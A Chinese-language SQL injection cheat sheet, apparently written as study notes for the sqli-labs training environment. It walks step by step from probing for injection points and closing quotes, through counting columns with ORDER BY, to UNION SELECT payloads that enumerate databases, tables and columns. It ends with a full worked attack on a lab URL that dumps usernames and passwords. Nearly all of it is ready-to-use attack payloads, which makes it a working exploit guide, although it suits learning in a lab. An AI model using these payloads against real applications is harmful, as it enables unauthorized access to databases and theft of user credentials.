# SQL 注入 Cheat Sheet 🐱

---

## 1️⃣ 查找注入点

```sql
-- 基础测试
?id=1      -- 正常
?id=1'     -- 报错 / 无返回 → 可能字符型
?id=1"     -- 报错 / 无返回 → 可能字符型
?id=1 and 1=1  -- 正常
?id=1 and 1=2  -- 异常 → 存在注入

-- 其他测试手法
?id=1' and '1'='1
?id=1' and '1'='2
?id=1" and "1"="1
?id=1" and "1"="2
```

---

## 2️⃣ 判断数字型 / 字符型注入

| 测试 | 数字型 | 字符型 |
|------|--------|--------|
| `?id=2-1` 返回 id=1 的结果 | ✅ 是数字型 | ❌ 不生效 |
| `?id=1'` 报错 | ❌ | ✅ 是字符型 |

**数字型：** 直接拼接数值，无需引号闭合  
**字符型：** 需要闭合引号，核心是**绕过引号闭合**

---

## 3️⃣ （字符注入）闭合方式

```sql
-- 常见闭合
?id=1' --+       -- 单引号闭合，注释掉后面
?id=1' #         -- 同上
?id=1' -- -      -- 同 --+（空格结尾变体）
?id=1' and '1'='1  -- 单引号闭合，and 构造永真
?id=1" --+          -- 双引号闭合
?id=1') --+         -- 单引号 + 括号
?id=1") --+         -- 双引号 + 括号
?id=1')) --+        -- 多层括号
```

> `--+` 中的 `+` 在 URL 中代表空格，实际是 `-- `（注释符后需要空格）

---

## 4️⃣ 默认查询列数

```sql
-- ORDER BY（推荐，稳定不报错）
?id=1 order by 1  -- 正常
?id=1 order by 2  -- 正常
...
?id=1 order by N  -- 报错 → 列数为 N-1

-- GROUP BY
?id=1 group by 1  -- 正常
?id=1 group by 2  -- 正常
...
?id=1 group by N  -- 报错 → 列数为 N-1
```

---

## 5️⃣ 查询回显位置

```sql
-- 用 union select 测试哪些位置有回显
?id=-1 union select 1,2,3,4 --+

-- 数字型（Less-2 示例）
?id=0 union select 1,2,3 --+
```

> `id` 设为不存在值（如 `-1` 或 `0`）确保 union 查询结果返回

---

## 6️⃣ 获取数据库名

```sql
?id=-1 union select 1,database(),3 --+
```

---

## 7️⃣ 查找表名

```sql
?id=-1 union select 1,group_concat(table_name),3
       from information_schema.tables
       where table_schema='security' --+
```

---

## 8️⃣ 查找列名

```sql
?id=-1 union select 1,group_concat(column_name),3
       from information_schema.columns
       where table_name='users'
         and table_schema='security' --+
```

---

## 9️⃣ 获取数据

```sql
?id=0 union select 1,
       group_concat(username,'~',password),3
       from users --+
```

---

## 📌 实战: Less-2（数字型注入完整流程）

```sql
http://172.19.19.113:81/sql_my/Less-2/?id=1             -- 正常
http://172.19.19.113:81/sql_my/Less-2/?id=1'            -- 无报错，说明不是字符型
http://172.19.19.113:81/sql_my/Less-2/?id=2-1            -- 返回 id=1 → 数字型 ✅
http://172.19.19.113:81/sql_my/Less-2/?id=1 order by 3  -- 3列 ✅
http://172.19.19.113:81/sql_my/Less-2/?id=0 union select 1,2,3  -- 回显位置 2,3
http://172.19.19.113:81/sql_my/Less-2/?id=0 union select 1,database(),3  -- security
http://172.19.19.113:81/sql_my/Less-2/?id=0 union select 1,group_concat(table_name),3
       from information_schema.tables where table_schema='security'
http://172.19.19.113:81/sql_my/Less-2/?id=0 union select 1,group_concat(column_name),3
       from information_schema.columns where table_name='users' and table_schema='security'
http://172.19.19.113:81/sql_my/Less-2/?id=0 union select 1,group_concat(username,'~',password),3
       from users --+
```

---

## 🧰 常用函数

| 函数 | 用途 |
|------|------|
| `database()` | 当前数据库名 |
| `user()` | 当前数据库用户 |
| `version()` | 数据库版本 |
| `@@datadir` | 数据库数据目录 |
| `group_concat()` | 多行合并为一行 |
| `concat()` | 字符串拼接 |
| `concat_ws()` | 带分隔符拼接 |
| `hex()` | 十六进制编码 |
| `unhex()` | 十六进制解码 |
| `substr()/substring()` | 截取字符串 |
| `length()` | 字符串长度 |
| `sleep()` | 时间盲注 |
| `if()` | 条件判断 |

---

## 📝 小贴士

- **数字型**不闭合，直接拼参数，简单直接
- **字符型**要关注闭合方式：`'`、`"`、`')`、`"))` 等
- `--+` 在 URL 中表示 `-- `（空格），也可以用 `#`（但 # 在 URL 中需要编码为 `%23`）
- 回显位置决定你往哪一列放查询结果
- 先确认列数，再找回显位，最后查数据——顺序很重要
